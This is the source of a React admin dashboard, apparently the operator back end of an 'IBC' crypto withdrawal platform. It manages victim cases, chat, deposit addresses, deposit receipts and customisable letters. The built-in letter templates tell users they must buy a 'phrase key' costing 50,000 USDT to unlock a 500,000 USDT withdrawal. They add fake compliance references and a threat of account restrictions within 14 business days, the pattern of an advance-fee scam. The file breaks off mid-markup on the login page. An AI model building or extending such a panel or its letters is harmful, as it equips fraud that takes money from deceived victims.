import React, { useEffect, useState, useRef, useMemo } from "react";
import { Card, CardContent, CardHeader, CardTitle, CardFooter } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { ScrollArea } from "@/components/ui/scroll-area";
import { 
  Table, 
  TableBody, 
  TableCell, 
  TableHead, 
  TableHeader, 
  TableRow 
} from "@/components/ui/table";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog";
import { ShieldAlert, RefreshCw, Trash2, Lock, Plus, UserCheck, FileText, FolderOpen, Edit3, History, User, Users, LogOut, ShieldCheck, Key, ExternalLink, X, MessageCircle, Send, Bell, AlertTriangle, Clock, CheckCircle, Image, Wallet, Upload, Mail, MailCheck, MapPin, Settings, Moon, Sun, BarChart3, TrendingUp, Activity } from "lucide-react";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer, PieChart, Pie, Cell, LineChart, Line, Legend } from "recharts";
import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
import { useToast } from "@/hooks/use-toast";
import { motion, AnimatePresence } from "framer-motion";
import { useTheme } from "@/App";

interface AdminData {
  vipStatus: string;
  username: string;
  withdrawalAmount: string;
  withdrawalBatches: string;
  physilocal0: string;
}

interface Case {
  id: string;
  accessCode: string;
  status: 'created' | 'registered' | 'syncing' | 'active' | 'completed';
  userName?: string;
  userEmail?: string;
  userMobile?: string;
  vipStatus?: string;
  username?: string;
  withdrawalAmount?: string;
  withdrawalBatches?: string;
  physilocal0?: string;
  depositAddress?: string;
  profileRedirectUrl?: string;
  hasRequirements?: boolean;
  letterSent?: boolean;
  landingPage?: string;
  priority?: string;
  assignedTo?: string;
  tags?: string;
  internalNotes?: string;
}

interface AdminMessage {
  id: number;
  caseId: string;
  category: 'urgent' | 'processing' | 'resolved';
  title: string;
  body: string;
  isRead: boolean;
  createdAt: string;
}

interface DepositReceipt {
  id: number;
  caseId: string;
  imageData: string;
  fileName?: string;
  notes?: string;
  status: 'pending' | 'approved' | 'rejected';
  adminNotes?: string;
  uploadedAt: string;
}

interface CaseLetter {
  id: number;
  caseId: string;
  headline?: string;
  introduction?: string;
  bodyContent?: string;
  footerNote?: string;
  complianceReference?: string;
  optionATitle?: string;
  optionADescription?: string;
  optionAAmount?: string;
  optionAFrequency?: string;
  optionABatches?: string;
  optionAKeyCost?: string;
  optionATotalRequirement?: string;
  optionATotalAmount?: string;
  optionAFilelocoId?: string;
  optionBTitle?: string;
  optionBDescription?: string;
  optionBAmount?: string;
  optionBFrequency?: string;
  optionBBatches?: string;
  optionBKeyCost?: string;
  optionBTotalRequirement?: string;
  optionBTotalAmount?: string;
  optionBFilelocoId?: string;
  phraseKeyRequirements?: string;
  complianceNotice?: string;
  scheduledFor?: string;
  expiresAt?: string;
}

interface Submission {
  id: number;
  caseId: string;
  selectedOption: string;
  notes?: string;
  userName?: string;
  userEmail?: string;
  withdrawalAmount?: string;
  withdrawalBatches?: string;
  submittedAt: string;
}

interface ChatMessage {
  id: number;
  caseId: string;
  sender: 'admin' | 'user';
  message: string;
  isRead: string;
  createdAt: string;
}

const playNotificationSound = () => {
  const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
  const oscillator = audioContext.createOscillator();
  const gainNode = audioContext.createGain();
  
  oscillator.connect(gainNode);
  gainNode.connect(audioContext.destination);
  
  oscillator.frequency.setValueAtTime(600, audioContext.currentTime);
  oscillator.frequency.setValueAtTime(800, audioContext.currentTime + 0.1);
  oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.2);
  
  gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
  gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
  
  oscillator.start(audioContext.currentTime);
  oscillator.stop(audioContext.currentTime + 0.3);
};

export default function AdminDashboard() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [authToken, setAuthToken] = useState<string | null>(null);
  const [loginUsername, setLoginUsername] = useState("");
  const [loginPassword, setLoginPassword] = useState("");
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  
  const [cases, setCases] = useState<Case[]>([]);
  const [allSubmissions, setAllSubmissions] = useState<Submission[]>([]);
  const [isDataLoading, setIsDataLoading] = useState(true);
  const [selectedCase, setSelectedCase] = useState<Case | null>(null);
  const [isCreateOpen, setIsCreateOpen] = useState(false);
  const [newAccessCode, setNewAccessCode] = useState("");
  const [isFinalizeOpen, setIsFinalizeOpen] = useState(false);
  const [isLetterEditorOpen, setIsLetterEditorOpen] = useState(false);
  const [isSubmissionsOpen, setIsSubmissionsOpen] = useState(false);
  const [caseSubmissions, setCaseSubmissions] = useState<Submission[]>([]);
  const [letterData, setLetterData] = useState<Partial<CaseLetter>>({
    headline: "Withdrawal Protocol Selection",
    introduction: "",
    bodyContent: "",
    footerNote: "",
    complianceReference: "",
    optionATitle: "Accelerated Release",
    optionADescription: "",
    optionAAmount: "",
    optionAFrequency: "every 12 hours",
    optionABatches: "",
    optionAKeyCost: "",
    optionATotalRequirement: "",
    optionBTitle: "Standard Release",
    optionBDescription: "",
    optionBAmount: "",
    optionBFrequency: "every 12 hours",
    optionBBatches: "",
    optionBKeyCost: "",
    optionBTotalRequirement: "",
    phraseKeyRequirements: "",
    complianceNotice: ""
  });
  const [landingPageEdit, setLandingPageEdit] = useState("dashboard");
  const [finalizeData, setFinalizeData] = useState<AdminData>({
    vipStatus: "Gold Tier",
    username: "",
    withdrawalAmount: "500,000 USDT",
    withdrawalBatches: "10",
    physilocal0: "PHY-001"
  });
  
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [chatCase, setChatCase] = useState<Case | null>(null);
  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
  const [newMessage, setNewMessage] = useState("");
  const [isSendingMessage, setIsSendingMessage] = useState(false);
  const [unreadCounts, setUnreadCounts] = useState<Record<string, number>>({});
  const [totalUnread, setTotalUnread] = useState(0);
  const chatScrollRef = useRef<HTMLDivElement>(null);
  const lastMessageCountRef = useRef<Record<string, number>>({});
  const isInitialLoadRef = useRef(true);
  
  // Track last known counts for notifications
  const lastRegisteredCountRef = useRef(0);
  const lastSubmissionsCountRef = useRef(0);
  const isInitialDataLoadRef = useRef(true);
  
  // Admin messages and deposit receipts
  const [adminMessages, setAdminMessages] = useState<AdminMessage[]>([]);
  const [depositReceipts, setDepositReceipts] = useState<DepositReceipt[]>([]);
  const [isAdminMessageOpen, setIsAdminMessageOpen] = useState(false);
  const [isReceiptsOpen, setIsReceiptsOpen] = useState(false);
  const [newAdminMessage, setNewAdminMessage] = useState({
    category: 'processing' as 'urgent' | 'processing' | 'resolved',
    title: '',
    body: ''
  });
  const [depositAddressEdit, setDepositAddressEdit] = useState("");
  const [profileRedirectEdit, setProfileRedirectEdit] = useState("");
  
  // Search and filter state
  const [searchQuery, setSearchQuery] = useState("");
  const [statusFilter, setStatusFilter] = useState<string>("all");
  
  // Filtered cases based on search and status filter
  const filteredCases = useMemo(() => {
    return cases.filter(c => {
      const matchesSearch = searchQuery === "" || 
        c.accessCode?.toLowerCase().includes(searchQuery.toLowerCase()) ||
        c.userName?.toLowerCase().includes(searchQuery.toLowerCase()) ||
        c.userEmail?.toLowerCase().includes(searchQuery.toLowerCase());
      
      const matchesStatus = statusFilter === "all" || c.status === statusFilter;
      
      return matchesSearch && matchesStatus;
    });
  }, [cases, searchQuery, statusFilter]);
  
  const { toast } = useToast();
  const { theme, toggleTheme } = useTheme();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoggingIn(true);
    
    try {
      const response = await fetch('/api/admin/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: loginUsername,
          password: loginPassword
        })
      });

      if (response.ok) {
        const data = await response.json();
        setAuthToken(data.token);
        setIsLoggedIn(true);
        sessionStorage.setItem('adminToken', data.token);
        toast({ title: "Access Granted", description: "Admin session established." });
      } else {
        toast({ variant: "destructive", title: "Access Denied", description: "Invalid credentials." });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Connection Error", description: "Unable to authenticate." });
    }
    
    setIsLoggingIn(false);
  };

  const handleLogout = () => {
    setIsLoggedIn(false);
    setAuthToken(null);
    setLoginUsername("");
    setLoginPassword("");
    sessionStorage.removeItem('adminToken');
    toast({ title: "Logged Out", description: "Admin session ended." });
  };

  // Check for existing session on mount
  useEffect(() => {
    const storedToken = sessionStorage.getItem('adminToken');
    if (storedToken) {
      fetch('/api/admin/verify', {
        headers: { 'Authorization': `Bearer ${storedToken}` }
      }).then(res => {
        if (res.ok) {
          setAuthToken(storedToken);
          setIsLoggedIn(true);
        } else {
          sessionStorage.removeItem('adminToken');
        }
      }).catch(() => {
        sessionStorage.removeItem('adminToken');
      });
    }
  }, []);

  // Session timeout after 3 minutes of inactivity
  useEffect(() => {
    if (!isLoggedIn) return;

    let timeoutId: NodeJS.Timeout;

    const resetTimeout = () => {
      if (timeoutId) clearTimeout(timeoutId);
      timeoutId = setTimeout(() => {
        handleLogout();
        toast({ title: "Session Expired", description: "You have been logged out due to inactivity." });
      }, 3 * 60 * 1000); // 3 minutes
    };

    const handleActivity = () => resetTimeout();

    // Add activity listeners
    window.addEventListener('mousemove', handleActivity);
    window.addEventListener('keypress', handleActivity);
    window.addEventListener('click', handleActivity);

    resetTimeout();

    return () => {
      window.removeEventListener('mousemove', handleActivity);
      window.removeEventListener('keypress', handleActivity);
      window.removeEventListener('click', handleActivity);
      if (timeoutId) clearTimeout(timeoutId);
    };
  }, [isLoggedIn]);

  const loadData = async (showToast = false) => {
    try {
      const [casesRes, submissionsRes] = await Promise.all([
        fetch('/api/cases'),
        fetch('/api/submissions')
      ]);
      
      if (casesRes.ok) {
        const data = await casesRes.json();
        
        // Check for new registrations
        const registeredCases = data.filter((c: Case) => c.status !== 'created');
        const currentRegisteredCount = registeredCases.length;
        
        if (!isInitialDataLoadRef.current && currentRegisteredCount > lastRegisteredCountRef.current) {
          const newCount = currentRegisteredCount - lastRegisteredCountRef.current;
          const newCase = registeredCases[registeredCases.length - 1];
          playNotificationSound();
          toast({ 
            title: "New User Registered", 
            description: `${newCase?.userName || 'A user'} has registered${newCount > 1 ? ` (+${newCount} total)` : ''}`
          });
        }
        lastRegisteredCountRef.current = currentRegisteredCount;
        
        setCases(data);
      }
      
      if (submissionsRes.ok) {
        const data = await submissionsRes.json();
        
        // Check for new submissions
        const currentSubmissionsCount = data.length;
        
        if (!isInitialDataLoadRef.current && currentSubmissionsCount > lastSubmissionsCountRef.current) {
          const newCount = currentSubmissionsCount - lastSubmissionsCountRef.current;
          const newSubmission = data[data.length - 1];
          playNotificationSound();
          toast({ 
            title: "New Submission", 
            description: `Option ${newSubmission?.selectedOption || ''} submitted${newCount > 1 ? ` (+${newCount} total)` : ''}`
          });
        }
        lastSubmissionsCountRef.current = currentSubmissionsCount;
        
        setAllSubmissions(data);
      }
      
      // Mark initial data load complete
      if (isInitialDataLoadRef.current) {
        isInitialDataLoadRef.current = false;
      }
      
      if (showToast) {
        toast({ title: "Refreshed", description: "Data has been updated." });
      }
    } catch (error) {
      if (showToast) {
        toast({ variant: "destructive", title: "Error", description: "Failed to refresh data." });
      }
    } finally {
      setIsDataLoading(false);
    }
  };

  useEffect(() => {
    if (isLoggedIn) {
      loadData();
      const interval = setInterval(loadData, 3000);
      return () => clearInterval(interval);
    }
  }, [isLoggedIn]);

  // Poll for chat messages from all cases
  useEffect(() => {
    if (!isLoggedIn || cases.length === 0) return;

    const pollAllMessages = async () => {
      const registeredCases = cases.filter(c => c.status !== 'created');
      const counts: Record<string, number> = {};
      let total = 0;

      for (const c of registeredCases) {
        try {
          const res = await fetch(`/api/cases/${c.id}/messages/unread?sender=user`);
          if (res.ok) {
            const data = await res.json();
            counts[c.id] = data.count;
            total += data.count;
            
            // Only show notifications after initial load
            if (!isInitialLoadRef.current && data.count > (lastMessageCountRef.current[c.id] || 0)) {
              playNotificationSound();
              toast({ title: "New Message", description: `New message from ${c.userName || 'User'}` });
            }
            lastMessageCountRef.current[c.id] = data.count;
          }
        } catch (error) {
          console.error('Failed to poll messages:', error);
        }
      }
      
      setUnreadCounts(counts);
      setTotalUnread(total);
      
      // Mark initial load complete after first poll
      if (isInitialLoadRef.current) {
        isInitialLoadRef.current = false;
      }
    };

    pollAllMessages();
    const interval = setInterval(pollAllMessages, 5000);
    return () => clearInterval(interval);
  }, [isLoggedIn, cases, toast]);

  // Poll messages for open chat (both popup and conversations tab)
  useEffect(() => {
    if (!chatCase) return;
    if (!isChatOpen) return; // Only poll when chatCase is selected

    const pollChatMessages = async () => {
      try {
        const res = await fetch(`/api/cases/${chatCase.id}/messages`);
        if (res.ok) {
          const messages = await res.json();
          setChatMessages(messages);
        }
      } catch (error) {
        console.error('Failed to poll chat messages:', error);
      }
    };

    pollChatMessages();
    const interval = setInterval(pollChatMessages, 2000);
    return () => clearInterval(interval);
  }, [isChatOpen, chatCase]);

  // Poll messages for conversations tab (when chatCase is set but popup is not open)
  useEffect(() => {
    if (!chatCase || isChatOpen) return;

    const pollConversationMessages = async () => {
      try {
        const res = await fetch(`/api/cases/${chatCase.id}/messages`);
        if (res.ok) {
          const messages = await res.json();
          setChatMessages(messages);
        }
      } catch (error) {
        console.error('Failed to poll conversation messages:', error);
      }
    };

    const interval = setInterval(pollConversationMessages, 2000);
    return () => clearInterval(interval);
  }, [chatCase, isChatOpen]);

  // Scroll to bottom when chat opens or new message
  useEffect(() => {
    if (chatScrollRef.current) {
      chatScrollRef.current.scrollTop = chatScrollRef.current.scrollHeight;
    }
  }, [chatMessages, isChatOpen]);

  // Mark messages as read when chat opens
  useEffect(() => {
    if (isChatOpen && chatCase) {
      fetch(`/api/cases/${chatCase.id}/messages/read`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sender: 'user' })
      }).then(() => {
        setUnreadCounts(prev => ({ ...prev, [chatCase.id]: 0 }));
        setTotalUnread(prev => Math.max(0, prev - (unreadCounts[chatCase.id] || 0)));
      });
    }
  }, [isChatOpen, chatCase]);

  const openChat = (caseData: Case) => {
    setChatCase(caseData);
    setIsChatOpen(true);
    setChatMessages([]);
  };

  // Unified send chat message function (used by both popup and conversations tab)
  const sendChatMessage = async () => {
    if (!newMessage.trim() || !chatCase || isSendingMessage) return;
    
    setIsSendingMessage(true);
    try {
      const res = await fetch(`/api/cases/${chatCase.id}/messages`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sender: 'admin', message: newMessage.trim() })
      });
      
      if (res.ok) {
        const msg = await res.json();
        setChatMessages(prev => [...prev, msg]);
        setNewMessage("");
      } else {
        toast({ variant: "destructive", title: "Error", description: "Failed to send message." });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to send message. Please try again." });
    }
    setIsSendingMessage(false);
  };

  // Load chat messages for conversations tab
  const loadChatMessages = async (caseId: string) => {
    try {
      const res = await fetch(`/api/cases/${caseId}/messages`);
      if (res.ok) {
        const messages = await res.json();
        setChatMessages(messages);
        // Mark messages as read
        fetch(`/api/cases/${caseId}/messages/read`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sender: 'user' })
        }).then(() => {
          setUnreadCounts(prev => ({ ...prev, [caseId]: 0 }));
        });
      } else {
        toast({ variant: "destructive", title: "Error", description: "Failed to load messages." });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to load messages." });
    }
  };

  const loadAdminMessages = async (caseId: string) => {
    try {
      const res = await fetch(`/api/cases/${caseId}/admin-messages`);
      if (res.ok) {
        const data = await res.json();
        setAdminMessages(data);
      } else {
        toast({ variant: "destructive", title: "Error", description: "Failed to load admin messages." });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to load admin messages." });
    }
  };

  const loadDepositReceipts = async (caseId: string) => {
    try {
      const res = await fetch(`/api/cases/${caseId}/deposit-receipts`);
      if (res.ok) {
        const data = await res.json();
        setDepositReceipts(data);
      } else {
        toast({ variant: "destructive", title: "Error", description: "Failed to load receipts." });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to load receipts." });
    }
  };

  const openAdminMessageDialog = (caseData: Case) => {
    setSelectedCase(caseData);
    loadAdminMessages(caseData.id);
    setDepositAddressEdit(caseData.depositAddress || "");
    setProfileRedirectEdit(caseData.profileRedirectUrl || "");
    setLandingPageEdit(caseData.landingPage || "dashboard");
    setIsAdminMessageOpen(true);
  };

  const openReceiptsDialog = (caseData: Case) => {
    setSelectedCase(caseData);
    loadDepositReceipts(caseData.id);
    setIsReceiptsOpen(true);
  };

  const sendNewAdminMessage = async () => {
    if (!newAdminMessage.title.trim() || !newAdminMessage.body.trim() || !selectedCase) return;
    
    try {
      const res = await fetch(`/api/cases/${selectedCase.id}/admin-messages`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(newAdminMessage)
      });
      
      if (res.ok) {
        const msg = await res.json();
        setAdminMessages(prev => [msg, ...prev]);
        setNewAdminMessage({ category: 'processing', title: '', body: '' });
        toast({ title: "Message Sent", description: "Admin message has been sent to the user." });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to send admin message." });
    }
  };

  const updateAdminMessageStatus = async (messageId: number, newCategory: 'urgent' | 'processing' | 'resolved') => {
    try {
      const res = await fetch(`/api/admin-messages/${messageId}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ category: newCategory })
      });
      
      if (res.ok) {
        const updated = await res.json();
        setAdminMessages(prev => prev.map(msg => msg.id === messageId ? { ...msg, category: newCategory } : msg));
        toast({ 
          title: "Status Updated", 
          description: `Message moved to ${newCategory.charAt(0).toUpperCase() + newCategory.slice(1)}`
        });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to update message status." });
    }
  };

  const updateDepositAddress = async () => {
    if (!selectedCase) return;
    
    try {
      const res = await fetch(`/api/cases/${selectedCase.id}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ depositAddress: depositAddressEdit })
      });
      
      if (res.ok) {
        loadData();
        toast({ title: "Updated", description: "Deposit address has been saved." });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to update deposit address." });
    }
  };

  const updateProfileRedirect = async () => {
    if (!selectedCase) return;
    
    try {
      const res = await fetch(`/api/cases/${selectedCase.id}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ profileRedirectUrl: profileRedirectEdit })
      });
      
      if (res.ok) {
        loadData();
        toast({ title: "Updated", description: "Profile redirect URL has been saved." });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to update profile redirect." });
    }
  };

  const toggleLetterSent = async (caseData: Case) => {
    try {
      const res = await fetch(`/api/cases/${caseData.id}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ letterSent: !caseData.letterSent })
      });
      
      if (res.ok) {
        loadData();
        toast({ 
          title: caseData.letterSent ? "Letter Hidden" : "Letter Sent",
          description: caseData.letterSent 
            ? "The user can no longer view the letter." 
            : "The user can now view the letter."
        });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to update letter status." });
    }
  };

  const updateLandingPage = async () => {
    if (!selectedCase) return;
    
    try {
      const res = await fetch(`/api/cases/${selectedCase.id}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ landingPage: landingPageEdit })
      });
      
      if (res.ok) {
        loadData();
        toast({ title: "Updated", description: "User landing page has been updated." });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to update landing page." });
    }
  };

  const updateReceiptStatus = async (receiptId: number, status: 'approved' | 'rejected', adminNotes?: string) => {
    try {
      const res = await fetch(`/api/deposit-receipts/${receiptId}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status, adminNotes })
      });
      
      if (res.ok) {
        setDepositReceipts(prev => prev.map(r => r.id === receiptId ? { ...r, status, adminNotes } : r));
        toast({ title: "Receipt Updated", description: `Receipt has been ${status}.` });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to update receipt status." });
    }
  };

  const clearData = async () => {
    if(confirm("Clear all simulated records?")) {
      try {
        await Promise.all(cases.map(c => 
          fetch(`/api/cases/${c.id}`, { method: 'DELETE' })
        ));
        loadData();
        toast({ title: "All cases cleared", description: "Database has been reset." });
      } catch (error) {
        toast({ variant: "destructive", title: "Error", description: "Failed to clear cases." });
      }
    }
  };

  const handleCreateCase = async () => {
    if (!newAccessCode) return;
    
    try {
      console.log('Creating case with access code:', newAccessCode);
      const response = await fetch('/api/cases', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          accessCode: newAccessCode,
          status: 'created'
        })
      });

      console.log('Response status:', response.status);
      
      if (response.ok) {
        const newCase = await response.json();
        setIsCreateOpen(false);
        setNewAccessCode("");
        loadData();
        toast({ title: "Case Created", description: `Access Code: ${newCase.accessCode}` });
      } else {
        const errorText = await response.text();
        console.error('Error response:', errorText);
        try {
          const errorData = JSON.parse(errorText);
          toast({ variant: "destructive", title: "Error", description: errorData.error || "Failed to create case." });
        } catch {
          toast({ variant: "destructive", title: "Error", description: errorText || "Failed to create case." });
        }
      }
    } catch (error) {
      console.error('Fetch error:', error);
      toast({ variant: "destructive", title: "Error", description: "Failed to create case. Check console for details." });
    }
  };

  const openFinalizeModal = async (c: Case) => {
    setSelectedCase(c);
    setFinalizeData({
      ...finalizeData,
      username: c.userName || ""
    });
    
    // Also load letter data for editing
    try {
      const response = await fetch(`/api/cases/${c.id}/letter`);
      if (response.ok) {
        const data = await response.json();
        if (data) {
          setLetterData(data);
        } else {
          setLetterData({
            headline: "Withdrawal Protocol Selection",
            introduction: `Dear ${c.userName || "Client"},\n\nWe acknowledge the successful completion of your re-authentication procedure.`,
            bodyContent: "In accordance with IBC cross-border withdrawal regulations, please review the finalised withdrawal options for your account.",
            footerNote: "Please select your preferred option below to proceed with the withdrawal process.",
            complianceReference: `CCR-${Date.now().toString(36).toUpperCase()}`,
            optionATitle: "Accelerated Release",
            optionADescription: "Full withdrawal amount processed in accelerated batches.",
            optionAAmount: "500,000 USDT",
            optionAFrequency: "every 12 hours",
            optionABatches: "10",
            optionAKeyCost: "50,000 USDT",
            optionATotalRequirement: "50,000 USDT",
            optionBTitle: "Standard Release",
            optionBDescription: "Half allocation processed in standard batches.",
            optionBAmount: "250,000 USDT",
            optionBFrequency: "every 24 hours",
            optionBBatches: "5",
            optionBKeyCost: "25,000 USDT",
            optionBTotalRequirement: "25,000 USDT",
            phraseKeyRequirements: "A phrase key is a cryptographic security measure that must be purchased to unlock and authorize each withdrawal transaction.",
            complianceNotice: "Important: All withdrawal protocols are subject to IBC compliance verification. Failure to complete selected option requirements within 14 business days may result in account restrictions."
          });
        }
      }
    } catch (error) {
      console.error('Failed to load letter:', error);
    }
    
    setIsFinalizeOpen(true);
  };

  const openLetterEditor = async (c: Case) => {
    setSelectedCase(c);
    try {
      const response = await fetch(`/api/cases/${c.id}/letter`);
      if (response.ok) {
        const data = await response.json();
        if (data) {
          setLetterData(data);
        } else {
          setLetterData({
            headline: "Withdrawal Protocol Selection",
            introduction: `Dear ${c.userName || "Client"},\n\nWe acknowledge the successful completion of your re-authentication procedure.`,
            bodyContent: "In accordance with IBC cross-border withdrawal regulations, please review the finalised withdrawal options for your account.",
            footerNote: "Please select your preferred option below to proceed with the withdrawal process.",
            complianceReference: `CCR-${Date.now().toString(36).toUpperCase()}`,
            optionATitle: "Accelerated Release",
            optionADescription: "Full withdrawal amount processed in accelerated batches.",
            optionAAmount: "500,000 USDT",
            optionAFrequency: "every 12 hours",
            optionABatches: "10",
            optionAKeyCost: "50,000 USDT",
            optionATotalRequirement: "50,000 USDT",
            optionBTitle: "Standard Release",
            optionBDescription: "Half allocation processed in standard batches.",
            optionBAmount: "250,000 USDT",
            optionBFrequency: "every 24 hours",
            optionBBatches: "5",
            optionBKeyCost: "25,000 USDT",
            optionBTotalRequirement: "25,000 USDT",
            phraseKeyRequirements: "A phrase key is a cryptographic security measure that must be purchased to unlock and authorize each withdrawal transaction.",
            complianceNotice: "Important: All withdrawal protocols are subject to IBC compliance verification. Failure to complete selected option requirements within 14 business days may result in account restrictions."
          });
        }
      }
    } catch (error) {
      console.error('Failed to load letter:', error);
    }
    setIsLetterEditorOpen(true);
  };

  const openSubmissionsModal = async (c: Case) => {
    setSelectedCase(c);
    try {
      const response = await fetch(`/api/cases/${c.id}/submissions`);
      if (response.ok) {
        const data = await response.json();
        setCaseSubmissions(data);
      }
    } catch (error) {
      console.error('Failed to load submissions:', error);
    }
    setIsSubmissionsOpen(true);
  };

  const handleSaveLetter = async () => {
    if (!selectedCase) return;
    
    try {
      const response = await fetch(`/api/cases/${selectedCase.id}/letter`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(letterData)
      });

      if (response.ok) {
        setIsLetterEditorOpen(false);
        toast({ title: "Letter Saved", description: "Custom letter content has been saved." });
      } else {
        toast({ variant: "destructive", title: "Error", description: "Failed to save letter." });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to save letter." });
    }
  };

  const handleFinalize = async () => {
    if (!selectedCase) return;
    
    try {
      // Save the letter first
      const letterResponse = await fetch(`/api/cases/${selectedCase.id}/letter`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(letterData)
      });

      if (!letterResponse.ok) {
        toast({ variant: "destructive", title: "Error", description: "Failed to save letter content." });
        return;
      }

      // Then finalize the case
      const response = await fetch(`/api/cases/${selectedCase.id}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          status: 'active',
          vipStatus: finalizeData.vipStatus,
          username: finalizeData.username,
          withdrawalAmount: finalizeData.withdrawalAmount,
          withdrawalBatches: finalizeData.withdrawalBatches,
          physilocal0: finalizeData.physilocal0
        })
      });

      if (response.ok) {
        setIsFinalizeOpen(false);
        setSelectedCase(null);
        loadData();
        toast({ title: "Account Activated", description: "User can now access the secure letter." });
      } else {
        toast({ variant: "destructive", title: "Error", description: "Failed to finalize case." });
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to finalize case." });
    }
  };

  const getCaseSubmissionCount = (caseId: string) => {
    return allSubmissions.filter(s => s.caseId === caseId).length;
  };

  const handleDeleteSubmission = async (submissionId: number) => {
    if (confirm("Delete this submission? This action cannot be undone.")) {
      try {
        const response = await fetch(`/api/submissions/${submissionId}`, {
          method: 'DELETE'
        });

        if (response.ok) {
          loadData(true);
          toast({ title: "Submission Deleted", description: "The submission has been removed." });
        } else {
          toast({ variant: "destructive", title: "Error", description: "Failed to delete submission." });
        }
      } catch (error) {
        toast({ variant: "destructive", title: "Error", description: "Failed to delete submission." });
      }
    }
  };

  // LOGIN PAGE
  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
        <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="max-w-md w-full">
          <div className="text-center mb-8">
            <img src={ibcLogo} alt="IBC Logo" className="h-16 w-16 object-contain mx-auto mb-4 opacity-90" data-testid="img-admin-logo" />
            <h1 className="text-xl font-bold text-white tracking-wider">ADMIN CONTROL PANEL</h1>
            <p className="text-slate-400 text-xs uppercase tracking-widest mt-1">ISO-D Compliance Management</p>
          </div>
          <Card className="bg-slate-950 border-slate-800 shadow-2xl">
            <CardHeader>
              <CardTitle className="text-white text-center flex items-center justify-center gap-2">
                <ShieldCheck className="w-4 h-4 text-amber-500" /> Administrator Access
              </CardTitle>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleLogin} className="space-y-4">
                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-400 uppercase">Username</label>
                  <div className="relative">
                    <User className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                    <Input 
                      type="text" 
                      placeholder="Enter admin username" 
                      className="pl-9 bg-slate-900 border-slate-800 text-white placeholder:text-slate-600"
                      value={loginUsername}
                      onChange={(e) => setLoginUsername(e.target.value)}
                      data-testid="input-admin-username"
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-400 uppercase">Password</label>
                  <div className="relative">
                    <Key className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                    <Input 
                      type="password" 
                      placeholder="Enter password" 
                      className="pl-9 bg-slate-900 border-slate-800 text-white placeholder:text-slate-600"
                      value={loginPassword}
                      onChange={(e) => setLoginPassword(e.target.value)}
                      data-testid="input-admin-password"
                    />
                  </div>
                </div>
                <Button 
                  type="submit" 
                  className="w-full bg-amber-600 hover:bg-amber-700 text-white"
                  disabled={isLoggingIn}
                  data-testid="button-admin-login"
                >
                  {isLoggingIn ? "Authenticating..." : "Access Control Panel"}
                </Button>
              </form>
            </CardContent>
            <CardFooter className="border-t border-slate-800 pt-4 pb-6 flex justify-center">
              <div className="flex items-center gap-2 text-[10px] text-slate-500 uppercase tracking-wider">
